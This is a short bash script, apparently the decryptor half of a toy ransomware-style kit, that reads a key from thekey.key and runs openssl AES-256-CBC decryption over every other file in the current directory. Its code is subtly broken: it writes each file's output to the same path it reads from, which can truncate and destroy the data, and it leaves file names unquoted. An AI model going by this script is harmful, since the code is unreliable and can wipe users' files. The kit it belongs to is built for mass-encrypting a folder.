#!/bin/bash

files=()

for file in *; do
    if [[ $file != "encrypt.sh" && $file != "thekey.key" && $file != "decrypt.sh" ]]; then
        if [[ -f $file ]]; then
            files+=("$file")
        fi
    fi
done

echo ${files[@]}

secretkey=$(cat thekey.key)

for file in "${files[@]}"; do
    openssl enc -d -aes-256-cbc -in $file -out $file -pass pass:$secretkey
done

echo "All of your files have been decrypted"
